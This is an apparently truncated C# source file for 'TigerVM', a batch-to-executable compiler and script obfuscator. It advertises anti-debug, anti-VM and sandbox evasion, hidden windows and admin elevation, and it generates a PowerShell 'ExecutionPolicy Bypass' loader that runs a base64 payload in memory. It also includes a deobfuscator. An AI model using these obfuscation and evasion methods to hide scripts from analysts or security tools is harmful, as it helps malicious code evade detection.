using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.IO.Compression;

[assembly: AssemblyTitle("TigerVM Enterprise Batch Compiler & Hardened Virtual Machine")]
[assembly: AssemblyDescription("Batch to Standalone TigerVM Hardened Native Executable & Script Obfuscator")]
[assembly: AssemblyCompany("tigergenz")]
[assembly: AssemblyProduct("TigerVM Enterprise Binary Suite")]
[assembly: AssemblyCopyright("Copyright (C) tigergenz")]
[assembly: AssemblyVersion("9.0.0.0")]
[assembly: AssemblyFileVersion("9.0.0.0")]

namespace TigerGenZ.BatCompiler
{
    class Program
    {
        private static readonly Random Rnd = new Random();

        static void Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;

            if (args.Length == 0)
            {
                RunInteractiveMode();
                return;
            }

            RunCliMode(args);
        }

        static void PrintBanner()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(@"
 ╔══════════════════════════════════════════════════════════════╗
 ║  T I G E R V M   ::   B A T C H   C O M P I L E R   P R O    ║
 ║  Zero-Disk Virtual Machine & Enterprise Binary Hardening     ║
 ║  Build v9.0.0-TITAN | Arch: RAM Pointers + Win32 Reg + Net   ║
 ╚══════════════════════════════════════════════════════════════╝");
            Console.ResetColor();
        }

        private static string ReadInputLine()
        {
            string line = Console.ReadLine();
            return line != null ? line.Trim() : "";
        }

        private static string ReadCleanPath()
        {
            string line = Console.ReadLine();
            return line != null ? line.Trim('"', ' ', '\'') : "";
        }

        #region Interactive Mode
        static void RunInteractiveMode()
        {
            PrintBanner();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("\n[?] Enter path or drag and drop .bat / .cmd file here:");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(" >> ");
            string inputPath = ReadCleanPath();

            if (string.IsNullOrEmpty(inputPath) || !File.Exists(inputPath))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[!] Error: File not found or invalid path.");
                Console.ResetColor();
                WaitExit();
                return;
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n[*] Selected Target: " + Path.GetFileName(inputPath));
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("\n[::] Operational Pipeline:");
            Console.WriteLine("  [1] Standalone Executable (TigerVM Virtual Machine - Zero-Disk)");
            Console.WriteLine("  [2] Hardened Executable (TigerVM + CFF + Anti-Analysis + Anti-Tamper)");
            Console.WriteLine("  [3] Maximum Defense PE (TigerVM + CFF + Anti-VM + Sandbox Evasion)");
            Console.WriteLine("  [4] Script Obfuscation (Level 3 - Polymorphic Chaos Matrix)");
            Console.WriteLine("  [5] Script Obfuscation (Level 2 - In-Memory Stdin Stream Loader)");
            Console.WriteLine("  [6] Disassemble & Inspect TigerVM Bytecode");
            Console.WriteLine("  [7] Run In-Terminal TigerVM Simulator & Tracer");
            Console.WriteLine("  [8] Decompile & Deobfuscate Batch Script (.bat)");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\n Selection [1-8] (Default: 2): ");
            string choice = ReadInputLine();
            if (string.IsNullOrEmpty(choice)) choice = "2";

            string scriptContent = File.ReadAllText(inputPath, Encoding.UTF8);
            string baseDir = Path.GetDirectoryName(Path.GetFullPath(inputPath));
            string baseName = Path.GetFileNameWithoutExtension(inputPath);

            if (choice == "6")
            {
                DisassembleScript(scriptContent);
                WaitExit();
                return;
            }
            if (choice == "7")
            {
                SimulateScript(scriptContent, new string[0]);
                WaitExit();
                return;
            }
            if (choice == "8")
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("\n[+] Running Multi-Pass Batch Decompiler & Deobfuscator Engine...");
                string decompiled = DeobfuscateBatchScript(scriptContent);
                string outDecompiled = Path.Combine(baseDir, baseName + "_decompiled.bat");
                File.WriteAllText(outDecompiled, decompiled, Encoding.UTF8);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n[OK] Decompiled script generated: " + outDecompiled);
                WaitExit();
                return;
            }

            if (choice == "1" || choice == "2" || choice == "3")
            {
                bool enableArmor = (choice == "2" || choice == "3");
                bool enableCff = (choice == "2" || choice == "3");
                bool enableAntiVm = (choice == "3");

                Console.Write("[?] Hide console window during execution? (y/N): ");
                bool hide = ReadInputLine().ToLower() == "y";

                Console.Write("[?] Require Administrator privileges via UAC? (y/N): ");
                bool admin = ReadInputLine().ToLower() == "y";

                Console.Write("[?] Custom application icon path (.ico) [Leave blank for default]: ");
                string icon = ReadCleanPath();
                if (!File.Exists(icon)) icon = null;

                string outExe = Path.Combine(baseDir, baseName + ".exe");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("\n[+] Compiling Batch with TigerVM v9.0-TITAN Engine...");
                if (enableCff) Console.WriteLine("[+] Applying Control Flow Flattening (CFF State Machine)...");
                if (enableArmor) Console.WriteLine("[+] Injecting Anti-Analysis, Anti-Debug, and SHA-256 Anti-Tamper...");
                if (enableAntiVm) Console.WriteLine("[+] Injecting Anti-VM & Automated Sandbox Evasion...");

                bool ok = CompileToTigerVmExe(scriptContent, outExe, hide, admin, icon, null, "tigergenz", enableArmor, enableCff, enableAntiVm);
                if (ok)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("\n[OK] Build complete: " + outExe);
                    Console.WriteLine("[*] Runtime Pipeline: TigerVM v9.0-TITAN Virtual Stack (100% In-Memory Execution)");
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[!] Build failed.");
                }
            }
            else
            {
                string outBat = Path.Combine(baseDir, baseName + "_protected.bat");
                string result = "";
                if (choice == "4")
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("\n[+] Generating Level 3 Polymorphic Chaos Matrix...");
                    result = ObfuscateInsane(scriptContent, "tigergenz");
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("\n[+] Generating Level 2 In-Memory Stdin Stream Loader...");
                    result = ObfuscateAdvanced(scriptContent, "tigergenz");
                }

                File.WriteAllText(outBat, result, Encoding.UTF8);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n[OK] Obfuscated script generated: " + outBat);
            }

            Console.ResetColor();
            WaitExit();
        }

        static void WaitExit()
        {
            Console.WriteLine("\nPress any key to exit...");
            Console.ReadKey(true);
        }
        #endregion

        #region CLI Mode
        static void RunCliMode(string[] args)
        {
            string inputPath = null;
            string outputPath = null;
            string mode = null;
            int level = 3;
            bool hide = false;
            bool admin = false;
            bool armor = true;
            bool cff = true;
            bool antiVm = false;
            bool doDisasm = false;
            bool doSimulate = false;
            bool doDecompile = false;
            string icon = null;
            string tag = "tigergenz";
            List<string> embeds = new List<string>();
            List<string> simArgs = new List<string>();

            for (int i = 0; i < args.Length; i++)
            {
                string a = args[i];
                if ((a == "-i" || a == "--input") && i + 1 < args.Length) inputPath = args[++i];
                else if ((a == "-o" || a == "--output") && i + 1 < args.Length) outputPath = args[++i];
                else if (a == "--mode" && i + 1 < args.Length) mode = args[++i];
                else if (a == "--level" && i + 1 < args.Length) int.TryParse(args[++i], out level);
                else if (a == "--insane") level = 3;
                else if (a == "--hide" || a == "--hidden") hide = true;
                else if (a == "--admin") admin = true;
                else if (a == "--armor" || a == "--anti-debug") armor = true;
                else if (a == "--no-armor") armor = false;
                else if (a == "--cff") cff = true;
                else if (a == "--no-cff") cff = false;
                else if (a == "--anti-vm" || a == "--anti-sandbox") antiVm = true;
                else if (a == "--disasm") doDisasm = true;
                else if (a == "--simulate") doSimulate = true;
                else if (a == "-d" || a == "--decompile" || a == "--deobf") doDecompile = true;
                else if (a == "--icon" && i + 1 < args.Length) icon = args[++i];
                else if ((a == "--tag" || a == "--signature") && i + 1 < args.Length) tag = args[++i];
                else if (a == "--embed")
                {
                    while (i + 1 < args.Length && !args[i + 1].StartsWith("-"))
                    {
                        embeds.Add(args[++i]);
                    }
                }
                else if (a == "--args")
                {
                    while (i + 1 < args.Length)
                    {
                        simArgs.Add(args[++i]);
                    }
                }
                else if (a == "-h" || a == "--help")
                {
                    PrintBanner();
                    ShowHelp();
                    return;
                }
                else if (!a.StartsWith("-") && inputPath == null)
                {
                    inputPath = a;
                }
            }

            PrintBanner();

            if (string.IsNullOrEmpty(inputPath) || !File.Exists(inputPath))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] Error: Input script path is required (-i <script.bat>)");
                Console.ResetColor();
                return;
            }

            string scriptContent = File.ReadAllText(inputPath, Encoding.UTF8);

            if (doDisasm)
            {
                DisassembleScript(scriptContent);
                return;
            }

            string baseDir = Path.GetDirectoryName(Path.GetFullPath(inputPath));
            string baseName = Path.GetFileNameWithoutExtension(inputPath);

            if (doDecompile || (!string.IsNullOrEmpty(mode) && (mode.ToLower() == "decompile" || mode.ToLower() == "deobf")))
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("\n[+] Running Multi-Pass Batch Decompiler & Deobfuscator Engine...");
                string decompiled = DeobfuscateBatchScript(scriptContent);
                if (string.IsNullOrEmpty(outputPath) || outputPath.EndsWith(".exe"))
                {
                    outputPath = Path.Combine(baseDir, baseName + "_decompiled.bat");
                }
                File.WriteAllText(outputPath, decompiled, Encoding.UTF8);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[OK] Decompiled script saved: " + outputPath);
                return;
            }

            if (doSimulate)
            {
                SimulateScript(scriptContent, simArgs.ToArray());
                return;
            }

            if (string.IsNullOrEmpty(mode))
            {
                if (!string.IsNullOrEmpty(outputPath) && outputPath.ToLower().EndsWith(".bat"))
                    mode = "obf";
                else
                    mode = "compile";
            }

            if (string.IsNullOrEmpty(outputPath))
            {
                outputPath = mode == "compile" ? Path.Combine(baseDir, baseName + ".exe") : Path.Combine(baseDir, baseName + "_protected.bat");
            }

            if (mode.ToLower() == "compile")
            {
                Console.WriteLine("[*] Source Target   : " + Path.GetFullPath(inputPath));
                Console.WriteLine("[*] Output Binary   : " + Path.GetFullPath(outputPath));
                Console.WriteLine("[*] Execution Model : TigerVM v9.0-TITAN (Zero-Disk In-Memory Virtual Stack)");
                Console.WriteLine("[*] Control Flow    : " + (cff ? "Control Flow Flattening (CFF ACTIVE)" : "Direct Linear Execution"));
                Console.WriteLine("[*] Armor Engine    : " + (armor ? "Anti-Analysis, Anti-Debug, SHA-256 Anti-Tamper ACTIVE" : "Standard"));
                Console.WriteLine("[*] Sandbox Evasion : " + (antiVm ? "Active Hypervisor & Minimal Spec Evasion" : "Standard"));
                Console.WriteLine("[*] Console Window  : " + (hide ? "Hidden (Background)" : "Standard Console"));
                Console.WriteLine("[*] Privilege Level : " + (admin ? "Elevated Administrator (requireAdministrator)" : "Standard User (asInvoker)"));

                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("\n[+] Compiling Bytecode and Hardening Native Binary...");
                bool ok = CompileToTigerVmExe(scriptContent, outputPath, hide, admin, icon, embeds.Count > 0 ? embeds.ToArray() : null, tag, armor, cff, antiVm);
                if (ok && File.Exists(outputPath))
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[OK] Build complete: " + outputPath);
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Compilation failed.");
                }
            }
            else
            {
                Console.WriteLine("[*] Source Target   : " + Path.GetFullPath(inputPath));
                Console.WriteLine("[*] Output File     : " + Path.GetFullPath(outputPath));
                Console.WriteLine("[*] Signature Tag   : " + tag);
                Console.WriteLine("[*] Obfuscation     : Level " + level + (level == 3 ? " [Polymorphic Chaos Matrix]" : ""));

                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("\n[+] Obfuscating Batch Script...");
                string res = "";
                if (level == 1) res = ObfuscateBasic(scriptContent, tag);
                else if (level == 2) res = ObfuscateAdvanced(scriptContent, tag);
                else res = ObfuscateInsane(scriptContent, tag);

                File.WriteAllText(outputPath, res, Encoding.UTF8);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[OK] Obfuscated script saved: " + outputPath);
            }
            Console.ResetColor();
        }

        static void ShowHelp()
        {
            Console.WriteLine(@"
Usage:
  batc -i <script.bat> [options]

Core Options:
  -i, --input <file>        Input .bat or .cmd script file (Required)
  -o, --output <file>       Output file path (.exe or .bat)
  --mode <compile|obf>      Target mode (Auto-detected by output extension)
  --cff                     Enable Control Flow Flattening state machine (Default: True)
  --no-cff                  Disable Control Flow Flattening
  --armor, --anti-debug     Enable Anti-Analysis, Anti-Debug, and SHA-256 Anti-Tamper
  --no-armor                Disable Anti-Analysis Armor
  --anti-vm, --anti-sandbox Enable Hypervisor & Sandbox Environment Evasion
  -d, --decompile, --deobf  Decompile and deobfuscate protected .bat scripts
  --disasm                  Disassemble script into readable TigerVM Bytecode
  --simulate [--args ...]   Run in-terminal TigerVM simulator and execution trace
  --insane                  Level 3 Maximum Polymorphic Chaos Obfuscation
  --level <1|2|3>           Obfuscation level (1: Slicing, 2: In-Memory Loader, 3: Chaos)
  --tag <name>              Custom signature tag (Default: tigergenz)
  --hide, --hidden          Hide console window (Background execution)
  --admin                   Request Administrator privileges (UAC prompt)
  --icon <icon.ico>         Set custom application .ico icon
  --embed <f1> <f2>...      Bundle extra asset files into the standalone .exe

Examples:
  batc -i app.bat -o app.exe --cff --armor --admin
  batc -i protected.bat --decompile -o restored.bat
  batc -i app.bat --disasm
  batc -i app.bat --simulate --args param1 param2
");
        }
        #endregion

        #region Obfuscation Engines
        public static string ObfuscateBasic(string content, string tag)
        {
            string safeBase = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ._-\\/:=,;*+?~#";
            HashSet<char> inScript = new HashSet<char>(content);
            List<char> poolList = new List<char>();
            foreach (char c in safeBase) if (inScript.Contains(c) || char.IsLetterOrDigit(c)) poolList.Add(c);
            Shuffle(poolList);
            string poolStr = new string(poolList.ToArray());

            Dictionary<char, string> map = new Dictionary<char, string>();
            for (int i = 0; i < poolStr.Length; i++)
            {
                map[poolStr[i]] = "%" + tag + ":~" + i + ",1%";
            }

            StringBuilder sb = new StringBuilder();
            sb.AppendLine(":: [ " + tag.ToUpper() + " SCRIPT PROTECTION PIPELINE ]");
            sb.AppendLine("@echo off");
            sb.AppendLine("set \"" + tag + "=" + poolStr + "\"");

            foreach (string line in content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None))
            {
                string trimmed = line.Trim();
                if (string.IsNullOrEmpty(trimmed)) { sb.AppendLine(); continue; }
                if (trimmed.StartsWith(":") && !trimmed.StartsWith("::")) { sb.AppendLine(line); continue; }

                StringBuilder lineSb = new StringBuilder();
                int i = 0;
                while (i < line.Length)
                {
                    if (line[i] == '%')
                    {
                        if (i + 1 < line.Length && (char.IsDigit(line[i + 1]) || line[i + 1] == '*' || line[i + 1] == '~'))
                        {
                            int end = i + 2;
                            while (end < line.Length && (char.IsLetterOrDigit(line[end]) || "dpnxsatz0123456789".IndexOf(line[end]) >= 0)) end++;
                            lineSb.Append(line.Substring(i, end - i));
                            i = end;
                            continue;
                        }
                        int nextPct = line.IndexOf('%', i + 1);
                        if (nextPct != -1 && (nextPct - i) < 30)
                        {
                            lineSb.Append(line.Substring(i, nextPct - i + 1));
                            i = nextPct + 1;
                            continue;
                        }
                        else
                        {
                            lineSb.Append('%');
                            i++;
                            continue;
                        }
                    }

                    char ch = line[i];
                    if ("\"'&|<>^!()".IndexOf(ch) >= 0)
                    {
                        lineSb.Append(ch);
                    }
                    else if (map.ContainsKey(ch) && Rnd.NextDouble() < 0.85)
                    {
                        lineSb.Append(map[ch]);
                    }
                    else
                    {
                        lineSb.Append(ch);
                    }
                    i++;
                }
                sb.AppendLine(lineSb.ToString());
            }
            return sb.ToString();
        }

        public static string ObfuscateAdvanced(string content, string tag)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(content);
            string b64 = Convert.ToBase64String(bytes);

            StringBuilder sb = new StringBuilder();
            sb.AppendLine(":: [ " + tag.ToUpper() + " IN-MEMORY STREAM LOADER ]");
            sb.AppendLine("@echo off");
            sb.AppendLine("setlocal EnableDelayedExpansion");
            sb.AppendLine("set \"" + tag + "_payload=\"");

            int chunkSize = 70;
            for (int i = 0; i < b64.Length; i += chunkSize)
            {
                int len = Math.Min(chunkSize, b64.Length - i);
                sb.AppendLine("set \"" + tag + "_payload=!" + tag + "_payload!" + b64.Substring(i, len) + "\"");
            }

            sb.AppendLine("powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"$b=[System.Convert]::FromBase64String('!" + tag + "_payload!');$s=[System.Text.Encoding]::UTF8.GetString($b);$psi=New-Object System.Diagnostics.ProcessStartInfo;$psi.FileName='cmd.exe';$psi.Arguments='/q';$psi.UseShellExecute=$false;$psi.RedirectStandardInput=$true;$p=[System.Diagnostics.Process]::Start($psi);$p.StandardInput.WriteLine($s);$p.StandardInput.Close();$p.WaitForExit();exit $p.ExitCode\"");
            sb.AppendLine("exit /b %ERRORLEVEL%");

            return sb.ToString();
        }

        public static string ObfuscateInsane(string content, string tag)
        {
            string safeBase = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ._-\\/:=,;*+?~#";
            HashSet<char> inScript = new HashSet<char>(content);
            List<char> poolList = new List<char>();
            foreach (char c in safeBase) if (inScript.Contains(c) || char.IsLetterOrDigit(c)) poolList.Add(c);

            int tableCount = 4;
            Dictionary<string, string> tables = new Dictionary<string, string>();
            char[] tableSuffixes = new[] { 'a', 'b', 'c', 'd' };
            for (int t = 0; t < tableCount; t++)
            {
                List<char> subList = new List<char>(poolList);
                Shuffle(subList);
                tables[tag + "_" + tableSuffixes[t]] = new string(subList.ToArray());
            }

            Dictionary<char, List<string>> charLookups = new Dictionary<char, List<string>>();
            foreach (var kv in tables)
            {
                for (int idx = 0; idx < kv.Value.Length; idx++)
                {
                    char ch = kv.Value[idx];
                    if (!charLookups.ContainsKey(ch)) charLookups[ch] = new List<string>();
                    charLookups[ch].Add("%" + kv.Key + ":~" + idx + ",1%");
                }
            }

            StringBuilder sb = new StringBuilder();
            sb.AppendLine(":: ====================================================================");
            sb.AppendLine("::  TIGERVM POLYMORPHIC SCRIPT ENCRYPTION MATRIX v5.0");
            sb.AppendLine("::  SIGNATURE: TGZ-0x" + Rnd.Next(0x100000, 0xFFFFFF).ToString("X6") + " // STRICT GUARD");
            sb.AppendLine(":: ====================================================================");
            sb.AppendLine("@echo off");
            sb.AppendLine("setlocal DisableDelayedExpansion");

            for (int g = 0; g < 3; g++)
            {
                sb.AppendLine("set \"" + tag + "_guard_" + Rnd.Next(100, 999) + "=0x" + Rnd.Next(0x10000000, int.MaxValue).ToString("X8") + "\" >nul 2>&1");
            }

            foreach (var kv in tables)
            {
                sb.AppendLine("set \"" + kv.Key + "=" + kv.Value + "\"");
            }

            sb.AppendLine(":" + tag + "_entry_" + Rnd.Next(1000, 9999));

            foreach (string line in content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None))
            {
                string trimmed = line.Trim();
                if (string.IsNullOrEmpty(trimmed))
                {
                    if (Rnd.NextDouble() < 0.3) sb.AppendLine("::" + tag + "_cksum_" + Rnd.Next(10000, 99999));
                    else sb.AppendLine();
                    continue;
                }
                if (trimmed.StartsWith(":") && !trimmed.StartsWith("::")) { sb.AppendLine(line); continue; }

                StringBuilder lineSb = new StringBuilder();
                int i = 0;
                while (i < line.Length)
                {
                    if (line[i] == '%')
                    {
                        if (i + 1 < line.Length && (char.IsDigit(line[i + 1]) || line[i + 1] == '*' || line[i + 1] == '~'))
                        {
                            int end = i + 2;
                            while (end < line.Length && (char.IsLetterOrDigit(line[end]) || "dpnxsatz0123456789".IndexOf(line[end]) >= 0)) end++;
                            lineSb.Append(line.Substring(i, end - i));
                            i = end;
                            continue;
                        }
                        int nextPct = line.IndexOf('%', i + 1);
                        if (nextPct != -1 && (nextPct - i) < 30)
                        {
                            lineSb.Append(line.Substring(i, nextPct - i + 1));
                            i = nextPct + 1;
                            continue;
                        }
                        else
                        {
                            lineSb.Append('%');
                            i++;
                            continue;
                        }
                    }

                    char ch = line[i];
                    if ("\"'&|<>^!()".IndexOf(ch) >= 0)
                    {
                        lineSb.Append(ch);
                    }
                    else if (charLookups.ContainsKey(ch))
                    {
                        var list = charLookups[ch];
                        lineSb.Append(list[Rnd.Next(list.Count)]);
                        if (Rnd.NextDouble() < 0.45)
                        {
                            lineSb.Append("%" + tag + "_" + Rnd.Next(1000, 9999) + "%");
                        }
                    }
                    else
                    {
                        lineSb.Append(ch);
                    }
                    i++;
                }
                sb.AppendLine(lineSb.ToString());
            }

            return sb.ToString();
        }

        private static void Shuffle<T>(IList<T> list)
        {
            int n = list.Count;
            while (n > 1)
            {
                n--;
                int k = Rnd.Next(n + 1);
                T val = list[k];
                list[k] = list[n];
                list[n] = val;
            }
        }
        #endregion

        #region TigerVM Decompiler & Deobfuscator Engine
        public static string DeobfuscateBatchScript(string content)
        {
            if (string.IsNullOrEmpty(content)) return "";

            // Pass 1: Extract PowerShell Base64 payload if present
            string b64Payload = TryExtractBase64Payload(content);
            if (!string.IsNullOrEmpty(b64Payload))
            {
                content = b64Payload;
            }

            // Pass 2: Extract variable definition dictionary
            Dictionary<string, string> varDict = ExtractVariableDefinitions(content);

            // Pass 3: Multi-pass variable slice expansion
            content = ExpandVariableSlices(content, varDict);

            // Pass 4: Caret and Quote normalization
            content = NormalizeEscapesAndNoise(content);

            // Pass 5: Remove obfuscation artifacts & tables
            content = StripObfuscationArtifacts(content);

            // Pass 6: Beautify output
            return BeautifyBatchScript(content);
        }

        private static string TryExtractBase64Payload(string content)
        {
            if (content.IndexOf("powershell", StringComparison.OrdinalIgnoreCase) >= 0 &&
                content.IndexOf("FromBase64String", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                var matches = Regex.Matches(content, @"set\s+""[^=]+=(?:![^!]+!)?([A-Za-z0-9+/=]{4,})""", RegexOptions.IgnoreCase);
                if (matches.Count > 0)
                {
                    StringBuilder sb = new StringBuilder();
                    foreach (Match m in matches)
                    {
                        if (m.Groups[1].Success) sb.Append(m.Groups[1].Value);
                    }
                    try
                    {
                        byte[] dec = Convert.FromBase64String(sb.ToString());
                        string utf8 = Encoding.UTF8.GetString(dec);
                        if (!string.IsNullOrEmpty(utf8) && utf8.Length > 5) return utf8;
                    }
                    catch { }
                }

                var direct = Regex.Match(content, @"FromBase64String\(['""]([A-Za-z0-9+/=]+)['""]\)", RegexOptions.IgnoreCase);
                if (direct.Success && direct.Groups[1].Success)
                {
                    try
                    {
                        byte[] dec = Convert.FromBase64String(direct.Groups[1].Value);
                        string utf8 = Encoding.UTF8.GetString(dec);
                        if (!string.IsNullOrEmpty(utf8) && utf8.Length > 5) return utf8;
                    }
                    catch { }
                }
            }
            return null;
        }

        private static Dictionary<string, string> ExtractVariableDefinitions(string content)
        {
            var dict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            var matches = Regex.Matches(content, @"^\s*set\s+(?:""([^=]+)=([^""]*)""|([^=\s]+)=([^\r\n]*))", RegexOptions.Multiline | RegexOptions.IgnoreCase);
            foreach (Match m in matches)
            {
                string k = m.Groups[1].Success ? m.Groups[1].Value.Trim() : (m.Groups[3].Success ? m.Groups[3].Value.Trim() : "");
                string v = m.Groups[1].Success ? m.Groups[2].Value : (m.Groups[4].Success ? m.Groups[4].Value.TrimEnd() : "");
                if (!string.IsNullOrEmpty(k) && !k.StartsWith("/") && v.Length > 0)
                {
                    dict[k] = v;
                }
            }
            return dict;
        }

        private static string ExpandVariableSlices(string content, Dictionary<string, string> varDict)
        {
            string current = content;
            for (int pass = 0; pass < 6; pass++)
            {
                bool changed = false;
                string next = Regex.Replace(current, @"%([a-zA-Z0-9_#$@]+):~(-?\d+(?:,-?\d+)?|\d+)%", m =>
                {
                    string vName = m.Groups[1].Value;
                    string spec = m.Groups[2].Value;
                    if (varDict.ContainsKey(vName))
                    {
                        string val = varDict[vName];
                        string[] parts = spec.Split(',');
                        int start = 0;
                        if (int.TryParse(parts[0], out start))
                        {
                            if (start < 0) start = Math.Max(0, val.Length + start);
                            if (start >= val.Length) { changed = true; return ""; }
                            if (parts.Length > 1)
                            {
                                int len = 0;
                                if (int.TryParse(parts[1], out len))
                                {
                                    if (len < 0) len = Math.Max(0, val.Length - start + len);
                                    len = Math.Min(len, val.Length - start);
                                    changed = true;
                                    return val.Substring(start, Math.Max(0, len));
                                }
                            }
                            changed = true;
                            return val.Substring(start);
                        }
                    }
                    return m.Value;
                }, RegexOptions.IgnoreCase);

                if (next != current)
                {
                    changed = true;
                    current = next;
                }
                if (!changed) break;
            }
            return current;
        }

        private static string NormalizeEscapesAndNoise(string content)
        {
            string[] lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
            List<string> result = new List<string>();

            foreach (string line in lines)
            {
                string trimmed = line.Trim();
                if (trimmed.StartsWith("::") || trimmed.StartsWith("rem ", StringComparison.OrdinalIgnoreCase))
                {
                    result.Add(line);
                    continue;
                }

                string cur = line;
                // Remove noise variables %tag_1234%
                cur = Regex.Replace(cur, @"%[a-zA-Z0-9_]+_\d{3,6}%", "");

                // Normalize carets in command tokens: ^c^m^d -> cmd
                cur = Regex.Replace(cur, @"\^([a-zA-Z0-9_\-/\\])", "$1");

                // Normalize quote insertions: c""m""d -> cmd
                cur = Regex.Replace(cur, @"(?<=[a-zA-Z0-9])""""(?=[a-zA-Z0-9])", "");

                result.Add(cur);
            }

            return string.Join("\r\n", result.ToArray());
        }

        private static string StripObfuscationArtifacts(string content)
        {
            string[] lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
            List<string> clean = new List<string>();

            foreach (string line in lines)
            {
                string trimmed = line.Trim();
                if (string.IsNullOrEmpty(trimmed))
                {
                    clean.Add("");
                    continue;
                }

                string lower = trimmed.ToLowerInvariant();
                if (lower.Contains("script protection pipeline") ||
                    lower.Contains("polymorphic script encryption matrix") ||
                    lower.Contains("in-memory stream loader") ||
                    lower.Contains("signature:") ||
                    lower.Contains("strict guard") ||
                    trimmed.StartsWith(":: ====") ||
                    Regex.IsMatch(trimmed, @"^::[a-zA-Z0-9_]+_cksum_\d+"))
                {
                    continue;
                }

                // Guard variables: set "tag_guard_123=0x..." >nul 2>&1
                if (Regex.IsMatch(trimmed, @"^set\s+""?[a-zA-Z0-9_]+_guard_\d+=0x[0-9a-fA-F]+""?.*$", RegexOptions.IgnoreCase))
                {
                    continue;
                }

                // Character lookup tables
                var tm = Regex.Match(trimmed, @"^set\s+""?([a-zA-Z0-9_]+)=([^""]+)""?$", RegexOptions.IgnoreCase);
                if (tm.Success)
                {
                    string v = tm.Groups[2].Value;
                    var unique = new HashSet<char>(v);
                    if (v.Length >= 30 && unique.Count >= 25) continue;
                }

                // Entry labels: :tag_entry_1234
                if (Regex.IsMatch(trimmed, @"^:[a-zA-Z0-9_]+_entry_\d+$", RegexOptions.IgnoreCase))
                {
                    continue;
                }

                // Strip setlocal DisableDelayedExpansion inserted solely by obfuscators if at the beginning
                if (lower == "setlocal disabledelayedexpansion" && clean.Count <= 2)
                {
                    continue;
                }

                clean.Add(line);
            }

            // Collapse multiple consecutive empty lines
            List<string> finalLines = new List<string>();
            int emptyCount = 0;
            foreach (string l in clean)
            {
                if (string.IsNullOrEmpty(l.Trim()))
                {
                    emptyCount++;
                    if (emptyCount <= 1) finalLines.Add("");
                }
                else
                {
                    emptyCount = 0;
                    finalLines.Add(l);
                }
            }

            return string.Join("\r\n", finalLines.ToArray()).Trim();
        }

        private static string BeautifyBatchScript(string content)
        {
            string[] lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
            List<string> result = new List<string>();
            int indent = 0;

            foreach (string line in lines)
            {
                string trimmed = line.Trim();
                if (string.IsNullOrEmpty(trimmed))
                {
                    result.Add("");
                    continue;
                }

                if (trimmed.StartsWith(")")) indent = Math.Max(0, indent - 1);

                string lead = new string(' ', indent * 4);

                if (trimmed.StartsWith(":") && !trimmed.StartsWith("::"))
                {
                    result.Add("\r\n" + trimmed);
                    continue;
                }

                result.Add(lead + trimmed);

                if (trimmed.EndsWith("(")) indent++;
            }

            return string.Join("\r\n", result.ToArray()).Trim() + "\r\n";
        }
        #endregion

        #region TigerVM Instruction Set & Compiler Engine
        public enum VmOpcode : byte
        {
            Nop = 0,
            Echo = 1,
            EchoToggle = 2,
            SetVar = 3,
            SetMath = 4,
            SetPrompt = 5,
            Goto = 6,
            Label = 7,
            IfCmp = 8,
            IfExist = 9,
            IfDefined = 10,
            IfErrorLevel = 11,
            CallSub = 12,
            Return = 13,
            Pause = 14,
            Cls = 15,
            Title = 16,
            Color = 17,
            Cd = 18,
            Delay = 19,
            ExecDirect = 20,
            PipeStream = 21,
            Exit = 22,
            ForNumeric = 23,
            ForFiles = 24,
            ForTokens = 25,
            WinApi = 26,
            ThreadStart = 27,
            ThreadWait = 28,
            VfsRead = 29,
            VfsWrite = 30,
            HudBanner = 31,
            HudProgress = 32,
            HudMatrix = 33,
            MemUnhook = 34,
            GuiMsgBox = 35,
            GuiInputBox = 36,
            GuiFileDialog = 37,
            HttpGet = 38,
            HttpPost = 39,
            Notify = 40,
            JsonGet = 41,
            JsonSet = 42,
            SqlExec = 43,
            SqlQuery = 44,
            ClipGet = 45,
            ClipSet = 46,
            CryptoAes = 47,
            CryptoHash = 48,
            TryStart = 49,
            Catch = 50,
            EndTry = 51,
            HudTable = 52,
